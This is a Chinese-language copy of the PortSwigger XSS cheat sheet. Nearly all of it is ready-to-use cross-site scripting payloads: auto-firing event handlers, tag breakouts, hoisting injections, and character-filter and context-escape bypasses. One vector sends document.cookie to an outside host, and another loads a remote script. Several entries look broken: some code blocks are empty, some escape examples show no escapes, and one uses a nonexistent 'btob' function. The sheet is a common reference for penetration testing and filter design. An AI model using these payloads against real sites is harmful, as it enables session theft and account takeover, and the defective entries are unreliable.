# PortSwigger XSS Cheat Sheet 完整版

> 来源: [PortSwigger XSS Cheat Sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
> 最后更新: 2026-07-10
> 定位: 完整收录 PortSwigger 官方 XSS Cheat Sheet 的全部 payload 和向量。

---

## 浏览器兼容性图例

- [C] = Chrome  |  [F] = Firefox  |  [S] = Safari
- 无标注 = 全平台通用
- 版本号标注表示仅该版本及以下支持

---

## 1. Event Handlers（事件处理器）

### 1.1 无需用户交互的事件处理器

这些事件无需用户点击或悬停即可自动触发。

| Event | Description | Tag | Code |
|-------|-------------|-----|------|
| onanimationstart | CSS 动画开始时触发 | style, div | `<style>@keyframes x{}</style><div style="animation-name:x" onanimationstart=alert(1)>` |
| onanimationend | CSS 动画结束时触发 | style, div | `<style>@keyframes x{}</style><div style="animation-name:x" onanimationend=alert(1)>` |
| onanimationiteration | CSS 动画迭代时触发 | style, div | `<style>@keyframes x{}</style><div style="animation-name:x" onanimationiteration=alert(1)>` |
| ontransitionstart | CSS 过渡开始时触发 | style, div | `<style>div{transition:all 1s}</style><div style="opacity:.99" ontransitionstart=alert(1)>` |
| ontransitionend | CSS 过渡结束时触发 | style, div | `<style>div{transition:all 1s}</style><div style="opacity:.99" ontransitionend=alert(1)>` |
| onload | 元素加载完成时触发 | body, img, iframe, svg | `<body onload=alert(1)>` `<img src=x onerror=alert(1)>` `<svg onload=alert(1)>` |
| onerror | 资源加载失败时触发 | img, video, audio, source | `<img src=x onerror=alert(1)>` `<video><source onerror=alert(1)>` |
| onfocus | 元素获得焦点时触发 (配合 autofocus) | input, select, textarea | `<input autofocus onfocus=alert(1)>` `<select autofocus onfocus=alert(1)>` |
| ontoggle | details 元素展开/收起时触发 | details | `<details open ontoggle=alert(1)>` |
| onscroll | 元素滚动时触发 | body, div | `<body onscroll=alert(1)>` (需要内容可滚动) |
| onmessage | 收到 postMessage 时触发 | window, iframe | 见 postMessage 注入章节 |

### 1.2 需要用户交互的事件处理器

需要用户交互（点击、悬停、按键等）才能触发的事件。

| Event | Description | Tag |
|-------|-------------|-----|
| onclick | 鼠标点击 | 所有可见元素 |
| onmouseover | 鼠标悬停 | 所有可见元素 |
| onmouseenter | 鼠标进入 | 所有可见元素 |
| onmouseleave | 鼠标离开 | 所有可见元素 |
| onmousemove | 鼠标移动 | 所有可见元素 |
| onmousedown | 鼠标按下 | 所有可见元素 |
| onmouseup | 鼠标释放 | 所有可见元素 |
| onpointerenter | 指针进入 | 所有可见元素 |
| onpointermove | 指针移动 | 所有可见元素 |
| onpointerover | 指针悬停 | 所有可见元素 |
| onpointerdown | 指针按下 | 所有可见元素 |
| onpointerrawupdate | 指针原始更新 | 所有可见元素 |
| onkeydown | 键盘按下 | input, body (需 focus) |
| onkeyup | 键盘释放 | input, body (需 focus) |
| onkeypress | 键盘按键 | input, body (需 focus) |
| oncut / oncopy / onpaste | 剪贴板操作 | input, textarea |
| onchange | 值改变 | input, select, textarea |
| oninput | 输入时 | input, textarea |
| onsubmit | 表单提交 | form |
| onreset | 表单重置 | form |
| onselect | 文本选中 | input, textarea |
| ondrag / ondrop | 拖拽操作 | 所有元素 |
| ontouchstart / ontouchend | 触摸操作 | 所有元素 |

---

## 2. Consuming Tags（消费型标签）

当注入点在某个标签内部（如 `<title>用户输入</title>`），且 `<>` 未被过滤时，先闭合外层标签再注入新标签。

### 2.1 Noembed 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<noembed><img title="</noembed><img src onerror=alert(1)>"></noembed>
```

### 2.2 Noscript 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<noscript><img title="</noscript><img src onerror=alert(1)>"></noscript>
```

### 2.3 Style 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<style><img title="</style><img src onerror=alert(1)>"></style>
```

### 2.4 Script 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<script><img title="</script><img src onerror=alert(1)>"></script>
```

### 2.5 iframe 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<iframe><img title="</iframe><img src onerror=alert(1)>"></iframe>
```

### 2.6 xmp 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<xmp><img title="</xmp><img src onerror=alert(1)>"></xmp>
```

### 2.7 textarea 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<textarea><img title="</textarea><img src onerror=alert(1)>"></textarea>
```

### 2.8 noframes 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<noframes><img title="</noframes><img src onerror=alert(1)>"></noframes>
```

### 2.9 Title 消费型标签（适用于 Chrome、Firefox、Safari）

```html
<title><img title="</title><img src onerror=alert(1)>"></title>
```

---

## 3. JS Hoisting（变量提升注入）

利用 JavaScript 的变量/函数提升（hoisting）机制，在注入点声明变量来覆盖前面引用的未定义标识符。注入点在 `INJECTION_STARTS_HERE` 位置。

### 3.1 通过未定义变量实现 XSS 变量提升（适用于 Chrome、Firefox、Safari）

```html
<script>eval(myUndefVar);var inject="INJECTION_STARTS_HERE";var myUndefVar;alert(1);//";</script>
```

### 3.2 通过未定义函数实现 XSS 变量提升（适用于 Chrome、Firefox、Safari）

```html
<script>myUndefFunction(13,37);var inject="INJECTION_STARTS_HERE";function myUndefFunction(){};alert(1);//";</script>
```

### 3.3 通过未定义类实现 XSS 变量提升（适用于 Chrome、Firefox、Safari）

```html
<script>var myUndefObject = new myUndefClass();var inject="INJECTION_STARTS_HERE";function myUndefClass(){};alert(1);//";</script>
```

### 3.4 XSS Hoisting via undefined JQuery $(document).ready()（适用于 Chrome、Firefox、Safari）

```html
<script>$(document).ready(function(){var inject="INJECTION_STARTS_HERE";});function $(){return{ready:()=>0}};alert(1);(function(){"";});</script>
```

### 3.5 通过未定义访问器参数实现 XSS 变量提升（对象语法）（适用于 Chrome、Firefox、Safari）

```html
<script>undef01.undef02("INJECTION"+alert(1));function undef01(){}//");</script>
```

### 3.6 通过未定义访问器参数实现 XSS 变量提升（数组语法）（适用于 Chrome、Firefox、Safari）

```html
<script>undef01['undef02','INJECTION'+alert(1)];function undef01(){};//'];</script>
```

### 3.7 通过未定义访问器实现 XSS 变量提升（module 类型 + import）（适用于 Chrome、Firefox、Safari）

```html
<script type="module">undef01.undef02.undef03.undef04.undef05();var inject = "INJECTION";import "data:text/jscript,alert(1)"//";</script>
```

### 3.8 通过原生函数劫持实现 XSS 变量提升（适用于 Chrome、Firefox、Safari）

```html
<script>var x=atob("dXNlbGVzcyBjYWxsIG9mIG5hdGl2ZSBmdW5jdGlvbiAh");undef01.undef02();var inject = "INJECTION";function atob(){alert(1);}//";</script>
```

---

## 4. File Upload Attacks（文件上传攻击）

### 4.1 向文件对象添加 blob（适用于 Chrome、Firefox、Safari）

```html
<input type="file" id="fileInput" /><script>const fileInput = document.getElementById('fileInput');const dataTransfer = new DataTransfer();const file = new File(['Hello world!'], 'hello.txt', {type: 'text/plain'});dataTransfer.items.add(file);fileInput.files = dataTransfer.files</script>
```

---

## 5. Restricted Characters（受限字符绕过）

当特定字符被过滤或编码时的绕过技术。

### 5.1 No Parentheses (无括号)

#### 5.1.1 通过异常处理实现无括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>onerror=alert;throw 1</script>
```

#### 5.1.2 通过异常处理实现无括号无分号调用（适用于 Chrome、Firefox、Safari）

```html
<script>{onerror=alert}throw 1</script>
```

#### 5.1.3 通过异常处理和表达式实现无括号无分号调用（适用于 Chrome、Firefox、Safari）

```html
<script>throw onerror=alert,1</script>
```

#### 5.1.4 通过异常处理和字符串 eval 实现无括号调用（Chrome / Edge）（适用于 Chrome）

```html
<script>throw onerror=eval,'=alert\x281\x29'</script>
```

#### 5.1.5 通过异常处理和字符串 eval 实现无括号调用（Safari）（适用于 Safari）

```html
<script>throw onerror=eval,'alert\x281\x29'</script>
```

#### 5.1.6 通过异常处理和对象 eval 实现无括号调用（Firefox）（适用于 Firefox）

```html
<script>{onerror=eval}throw{lineNumber:1,columnNumber:1,fileName:1,message:'alert\x281\x29'}</script>
```

#### 5.1.7 通过异常处理和对象 eval 实现无括号调用（Firefox） / Safari（适用于 Firefox、Safari）

```html
<script>throw onerror=eval,e=new Error,e.message='alert\x281\x29',e</script>
```

#### 5.1.8 通过异常处理和 location hash eval 实现无括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>throw onerror=Uncaught=eval,e=new Error,e.message='/*'+location.hash,!!window.InstallTrigger?e:e.message</script>
```

#### 5.1.9 通过异常处理和 location hash eval 实现无括号、无引号、无空格调用（适用于 Chrome、Firefox、Safari）

```html
<script>throw{},onerror=Uncaught=eval,h=location.hash,e={lineNumber:1,columnNumber:1,fileName:0,message:h[2]+h[1]+h},!!window.InstallTrigger?e:e.message</script>
```

#### 5.1.10 通过异常处理和 location hash eval 实现无括号、无引号、无空格、无花括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>throw/x/,onerror=Uncaught=eval,h=location.hash,e=Error,e.lineNumber=e.columnNumber=e.fileName=e.message=h[2]+h[1]+h,!!window.InstallTrigger?e:e.message</script>
```

#### 5.1.11 通过 ES6 hasInstance 和 instanceof 配合 eval 实现无括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>'alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}</script>
```

#### 5.1.12 通过 ES6 hasInstance 和 instanceof 配合 eval 实现无括号调用（不使用点号）（适用于 Chrome、Firefox、Safari）

```html
<script>'alert\x281\x29'instanceof{[Symbol['hasInstance']]:eval}</script>
```

#### 5.1.13 通过 location 重定向实现无括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>location='javascript:alert\x281\x29'</script>
```

#### 5.1.14 通过 location 重定向实现无括号无字符串调用（适用于 Chrome、Firefox、Safari）

```html
<script>location=name</script>
```

#### 5.1.15 通过模板字符串实现无括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>alert`1`</script>
```

#### 5.1.16 通过模板字符串和 location hash 实现无括号调用（适用于 Chrome、Firefox、Safari）

```html
<script>new Function`X${document.location.hash.substr`1`}`</script>
```

#### 5.1.17 通过模板字符串和 location hash 实现无括号无空格调用（适用于 Chrome、Firefox、Safari）

```html
<script>Function`X${document.location.hash.substr`1`}```</script>
```

#### 5.1.18 无括号、反引号、引号的 XSS Cookie 窃取（适用于 Chrome、Firefox、Safari）

```html
<video><source onerror=location=/\02.rs/+document.cookie>
```

### 5.2 无需大于号

#### 5.2.1 无需大于号的 XSS（适用于 Chrome、Firefox、Safari）

```html
<svg onload=alert(1)
```

#### 5.2.2 使用 HTML 注释绕过大于号限制（适用于 Chrome、Firefox、Safari）

```html
<svg onload=alert(1)<!--
```

#### 5.2.3 使用 innerHTML 和 outerHTML 避免大于号（适用于 Chrome、Firefox、Safari）

```html
<svg onload=outerHTML=id id=<img/src/onerror=alert(1)&gt;
```

### 5.3 解构与替代赋值

#### 5.3.1 基于数组解构配合 onerror（适用于 Chrome、Firefox、Safari）

```html
<script>throw[onerror]=[alert],1</script>
```

#### 5.3.2 使用解构配合 onerror（适用于 Chrome、Firefox、Safari）

```html
<script>var{a:onerror}={a:alert};throw 1</script>
```

#### 5.3.3 使用默认值解构配合 onerror（适用于 Chrome、Firefox、Safari）

```html
<script>var{haha:onerror=alert}=0;throw 1</script>
```

#### 5.3.4 使用 window.name 的向量（适用于 Chrome、Firefox、Safari）

```html
<script>window.name='javascript:alert(1)';</script><svg onload=location=name>
```

#### 5.3.5 使用对象字面量避免赋值左侧无效错误`（适用于 Chrome、Firefox、Safari）

```html
<script>window.name='javascript:alert(1)';function blah(){} blah(""+{a:location=name}+"")</script>
```

#### 5.3.6 使用 new class 避免赋值左侧无效错误（适用于 Chrome、Firefox、Safari）

```html
<script>window.name='javascript:alert(1)';function blah(){} blah(""+new class b{toString=e=>location=name}+"")</script>
```

### 5.4 仅大写字母

#### 5.4.1 仅使用大写的 Script 标签（适用于 Chrome、Firefox、Safari）

```html
<SCRIPT SRC=HTTPS://PORTSWIGGER-LABS.NET/A.JS></SCRIPT>
```

#### 5.4.2 仅使用大写和 JSFuck 的内联 Script 标签（适用于 Chrome、Firefox、Safari）

```html
<SCRIPT>[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]][([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((!![]+[])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+!+[]]+(+[![]]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]+(+(!+[]+!+[]+!+[]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+!+[]+[!+[]+!+[]])+(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]])()((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]]+[])[+!+[]+[!+[]+!+[]+!+[]]]+[+!+[]]+([+[]]+![]+[][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(!![]+[])[+[]]])[!+[]+!+[]+[+[]]])</SCRIPT>
```

### 5.5 onerror + throw 变体

#### 5.5.1 window.name 配合 onerror 和 throw（适用于 Chrome）

```html
<script>throw onerror=eval,name</script>
```

#### 5.5.2 location 配合 onerror 和 throw（适用于 Chrome）

```html
<script>throw onerror=eval,'/*'+location</script>
```

#### 5.5.3 SVG 配合 onerror、throw 和 document.URL（适用于 Chrome）

```html
<svg onload="throw top.onerror=eval,'/*'+URL">
```

#### 5.5.4 body 配合 onerror、throw 和 location（适用于 Chrome）

```html
<body onload="throw onerror=eval,'/*'+location">
```

#### 5.5.5 SVG onerror 和 XSS new 构造函数（适用于 Safari）

```html
<svg onload=onerror=eval;new'"-alert\x281\x29//'>
```

#### 5.5.6 onerror 和 window.name 上的 new 操作符（适用于 Safari）

```html
<script>onerror=eval,new name</script>
```

#### 5.5.7 onerror 和 Error 对象（Firefox 和 Safari）（适用于 Firefox、Safari）

```html
<script>throw onerror=eval,x=new Error,x.message='alert\x281\x29',x</script>
```

#### 5.5.8 onerror 和 Error 对象（适用于 Chrome）

```html
<script>throw onerror=eval,x=new Error,x.name='',x.message='=alert\x281\x29',x</script>
```

### 5.6 事件对象原型覆盖技术

通过覆盖 Event.prototype.toString 和特定事件来触发代码执行。

#### 5.6.1 ondevicemotion 和 URIError 对象（适用于 Chrome）

```html
<script>ondevicemotion=setTimeout;Event.prototype.toString=URIError.prototype.toString;Event.prototype.message='alert\x281\x29'</script>
```

#### 5.6.2 ondeviceorientation 和 Error 对象（适用于 Chrome）

```html
<script>ondeviceorientation=setTimeout;Event.prototype.toString=Error.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
```

#### 5.6.3 ondeviceorientationabsolute 和 WebTransportError 对象（适用于 Chrome）

```html
<script>ondeviceorientationabsolute=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
```

#### 5.6.4 onpagereveal 和 AggregateError 对象（适用于 Chrome）

```html
<script>onpagereveal=setTimeout;Event.prototype.toString=AggregateError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
```

#### 5.6.5 onpageswap 和 EvalError 对象（适用于 Chrome）

```html
<script>onpageswap=setTimeout;location='x';Event.prototype.toString=EvalError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
```

#### 5.6.6 onmessage 和 RangeError 对象（适用于 Chrome、Firefox、Safari）

```html
<iframe id=target></iframe><script>target.src='xss.php?x=<img/src/onerror=onmessage=setTimeout;Event.prototype.toString=RangeError.prototype.toString;Event.prototype.name="alert\x281\x29">';target.onload=setTimeout(function(){frames[0].postMessage("", "*")},100)</script>
```

#### 5.6.7 onhashchange 和 Regex 对象（适用于 Chrome、Firefox、Safari）

```html
<script>onhashchange=setTimeout;location.hash=location;Event.prototype.flags='.call\x28alert\x281\x29\x29';Event.prototype.toString=/x/.toString</script>
```

#### 5.6.8 onscroll 和 ReferenceError 对象（适用于 Chrome、Firefox、Safari）

```html
<script>onscroll=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=ReferenceError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
```

#### 5.6.9 onscrollend 和 SyntaxError 对象（适用于 Chrome、Firefox、Safari）

```html
<script>onscrollend=setTimeout;document.body.style.height='9999px';document.documentElement.scrollTop=1;Event.prototype.toString=SyntaxError.prototype.toString;Event.prototype.name='alert\x281\x29'</script>
```

#### 5.6.10 onselect 和 TypeError 对象（适用于 Chrome、Firefox、Safari）

```html
<input value=x autofocus onfocus="window.onselect=setTimeout;this.selectionStart=1;Event.prototype.toString=TypeError.prototype.toString;Event.prototype.message='alert\x281\x29'">
```

#### 5.6.11 ontransitionstart / ontransitionend / ontransitionrun 和箭头函数（适用于 Chrome、Firefox、Safari）

```html
<img/src/style=transition:0.1s onerror="window.ontransitionstart=setTimeout;this.style.opacity=0;Event.prototype.toString=x=>'alert\x281\x29'">
```

#### 5.6.12 onload 和 DOMException 对象（适用于 Chrome、Firefox、Safari）

```html
<img/src/onerror="window.onload=setTimeout;Event.prototype.toString=DOMException.prototype.toString;Event.prototype.name='alert\x281\x29'">
```

#### 5.6.13 onpageshow 和 WebTransportError 对象（适用于 Chrome、Firefox、Safari）

```html
<img/src/onerror=onpageshow=setTimeout;Event.prototype.toString=WebTransportError.prototype.toString;Event.prototype.name='alert\x281\x29'>
```

#### 5.6.14 onerror 和 ReferenceError（不使用 throw）（适用于 Chrome、Firefox、Safari）

```html
<img/src/onerror=window.onerror=eval;ReferenceError.prototype.name=';alert\x281\x29;var\x20Uncaught//';z>
```

### 5.7 将 Payload 隐藏在属性中

#### 5.7.1 重定义 onerror 并将 payload 隐藏在属性中（适用于 Chrome、Firefox、Safari）

```html
<img src onerror=src=1,attributes[1].value=alt+id alt=ale id=rt&lpar;1&rpar;>
```

#### 5.7.2 属性 + SVG，payload 隐藏在 window.name 中（适用于 Chrome、Firefox、Safari）

```html
<svg onload="attributes[0].value=name,new onload">
```

#### 5.7.3 属性 + SVG + onload 事件，payload 隐藏在 URL 和模板字符串中（适用于 Chrome、Firefox、Safari）

```html
<svg onload="attributes[0].value=id+URL+id,new onload" id=`>
```

#### 5.7.4 属性 + input + onfocus 事件，payload 隐藏在 URL 和模板字符串中（适用于 Chrome、Firefox、Safari）

```html
<input onfocus="attributes[0].value=id+URL+id,new onfocus" id=` autofocus>
```

#### 5.7.5 属性 + input + onclick 事件，payload 隐藏在 URL 和模板字符串中（需要两次点击）)（适用于 Chrome、Firefox、Safari）

```html
<input onclick=attributes[0].value='`'+URL+'`'>
```

#### 5.7.6 Form action + input，payload 隐藏在 window.name 中（适用于 Chrome、Firefox、Safari）

```html
<form><input onclick="formAction=top.name,type='submit',new submit">
```

#### 5.7.7 SVG + innerHTML 解码 URL 后通过 textContent 赋值（payload 隐藏在 URL 中）（适用于 Chrome、Safari）

```html
<svg onload=innerHTML=URL,innerHTML=textContent>
```

#### 5.7.8 img + innerHTML 解码 URL 后通过 textContent 赋值（payload 隐藏在 URL 中）（适用于 Chrome、Firefox、Safari）

```html
<img/src/onerror=innerHTML=URL,innerHTML=textContent>
```

#### 5.7.9 innerHTML 解码 URL 后通过 textContent 调用 eval（payload 隐藏在 URL 中）（适用于 Chrome、Firefox、Safari）

```html
<svg onload=innerHTML=URL,eval(textContent)>
```

### 5.8 上下文特定的逃逸 Payload

这些 payload 针对特定的注入上下文（js_string_single, js_comment, attribute_double, attribute_unquoted, attribute_href, html 等）。

#### 5.8.1 js_string_single 上下文 -- U+2028 行分隔符（适用于 Chrome、Firefox、Safari）

```javascript
'-prompt(1)-'
```

```
'-[U+2028]alert(1)'
```

#### 5.8.2 js_string_single 上下文 -- U+2029 段分隔符（适用于 Chrome、Firefox、Safari）

```
'-[U+2029]alert(1)'
```

#### 5.8.3 js_string_single 上下文 -- prompt()（适用于 Chrome、Firefox、Safari）

```javascript
'-prompt(1)-'
```

#### 5.8.4 js_string_single 上下文 -- confirm()（适用于 Chrome、Firefox、Safari）

```javascript
'-confirm(1)-'
```

#### 5.8.5 js_string_single 上下文 -- window[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-window['a'+'lert'](1)-'
```

#### 5.8.6 js_string_single 上下文 -- 模板字面量字符串 + window[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-window[`a`+'lert'](1)-'
```

#### 5.8.7 js_string_single 上下文 -- \u0061 转义（适用于 Chrome、Firefox、Safari）

```javascript
'-alert(1)-'
```

#### 5.8.8 js_string_single 上下文 -- \u{0061} 转义（适用于 Chrome、Firefox、Safari）

```javascript
'-\u{0061}lert(1)-'
```

#### 5.8.9 js_string_single 上下文 -- \u{61} 转义（适用于 Chrome、Firefox、Safari）

```javascript
'-\u{61}lert(1)-'
```

#### 5.8.10 js_string_single 上下文 -- \u{00000000000061} 转义（适用于 Chrome、Firefox、Safari）

```javascript
'-\u{00000000000061}lert(1)-'
```

#### 5.8.11 js_string_single 上下文 -- self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self['a'+'lert'](1)-'
```

#### 5.8.12 js_string_single 上下文 -- 模板字面量字符串 + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[`${`a`}lert`](1)-'
```

#### 5.8.13 js_string_single 上下文 -- \a 字面量 + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self['\a'+'lert'](1)-'
```

#### 5.8.14 js_string_single 上下文 -- \x61 转义 + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self['\x61'+'lert'](1)-'
```

#### 5.8.15 js_string_single 上下文 -- \141 八进制转义 + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self['\141'+'lert'](1)-'
```

#### 5.8.16 js_string_single 上下文 -- /a/.source + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[/a/.source+/lert/.source](1)-'
```

#### 5.8.17 js_string_single 上下文 -- atob.name[0] + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[atob.name[0]+'lert'](1)-'
```

#### 5.8.18 js_string_single 上下文 -- String.fromCharCode(0x61) + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[String.fromCharCode(0x61)+'lert'](1)-'
```

#### 5.8.19 js_string_single 上下文 -- String.fromCodePoint(0x61) + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[String.fromCodePoint(0x61)+'lert'](1)-'
```

#### 5.8.20 js_string_single 上下文 -- 10..toString(17) + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[10..toString(17)+'lert'](1)-'
```

#### 5.8.21 js_string_single 上下文 -- 10n.toString(17) + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[10n.toString(17)+'lert'](1)-'
```

#### 5.8.22 js_string_single 上下文 -- 0xa.toString(17) + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[0xa.toString(17)+'lert'](1)-'
```

#### 5.8.23 js_string_single 上下文 -- atob('YQ==') + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[atob('YQ==')+'lert'](1)-'
```

#### 5.8.24 js_string_single 上下文 -- unescape('%61') + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[unescape('%61')+'lert'](1)-'
```

#### 5.8.25 js_string_single 上下文 -- decodeURI('%61') + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[decodeURI('%61')+'lert'](1)-'
```

#### 5.8.26 js_string_single 上下文 -- decodeURIComponent('%61') + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self[decodeURIComponent('%61')+'lert'](1)-'
```

#### 5.8.27 js_string_single 上下文 -- +[] 强制转换 + self[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-self['a'+[]+'lert'](1)-'
```

#### 5.8.28 js_string_single 上下文 -- frames[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-frames['a'+'lert'](1)-'
```

#### 5.8.29 js_string_single 上下文 -- globalThis[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-globalThis['a'+'lert'](1)-'
```

#### 5.8.30 js_string_single 上下文 -- top[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-top['a'+'lert'](1)-'
```

#### 5.8.31 js_string_single 上下文 -- parent[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-parent['a'+'lert'](1)-'
```

#### 5.8.32 js_string_single 上下文 -- this[] 访问（适用于 Chrome、Firefox、Safari）

```javascript
'-this['a'+'lert'](1)-'
```

#### 5.8.33 js_string_single 上下文 -- alert 模板字符串（适用于 Chrome、Firefox、Safari）

```javascript
'-alert`1`-'
```

#### 5.8.34 js_string_single 上下文 -- ; 分隔符 + throw onerror=alert（适用于 Chrome、Firefox、Safari）

```javascript
';throw onerror=alert,1;'
```

#### 5.8.35 js_string_single 上下文 -- LF 分隔符 + throw onerror=alert（适用于 Chrome、Firefox、Safari）

```

```

#### 5.8.36 js_string_single 上下文 -- U+2028 行分隔符 + throw onerror=alert（适用于 Chrome、Firefox、Safari）

```

```

#### 5.8.37 js_string_single 上下文 -- U+2029 段分隔符 + throw onerror=alert（适用于 Chrome、Firefox、Safari）

```

```

#### 5.8.38 js_string_single 上下文 -- location=name（适用于 Chrome、Firefox、Safari）

```javascript
'-[location=name]-'
```

#### 5.8.39 js_string_single 上下文 -- location.href=name（适用于 Chrome、Firefox、Safari）

```javascript
'-[location.href=name]-'
```

#### 5.8.40 js_string_single 上下文 -- location=javascript: %XX 括号编码（适用于 Chrome、Firefox、Safari）

```javascript
'-[location='javascript:alert%281%29']-'
```

#### 5.8.41 js_string_single 上下文 -- location=javascript: \xNN 括号编码（适用于 Chrome、Firefox、Safari）

```javascript
'-[location='javascript:alert\x281\x29']-'
```

#### 5.8.42 js_string_single 上下文 -- location=javascript: \u 括号编码（适用于 Chrome、Firefox、Safari）

```javascript
'-[location='javascript:alert(1)']-'
```

#### 5.8.43 js_string_single 上下文 -- location=javascript: 八进制括号编码（适用于 Chrome、Firefox、Safari）

```javascript
'-[location='javascript:alert\501\51']-'
```

#### 5.8.44 js_string_single 上下文 -- Symbol.hasInstance+eval（适用于 Chrome、Firefox、Safari）

```javascript
'-['alert\x281\x29'instanceof{[Symbol.hasInstance]:eval}]-'
```

#### 5.8.45 js_string_single 上下文 -- atob.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-atob.constructor('a'+'lert(1)')()-'
```

#### 5.8.46 js_string_single 上下文 -- btob.constructor()（适用于 Chrome、Firefox、Safari）

```javascript
'-btob.constructor('a'+'lert(1)')()-'
```

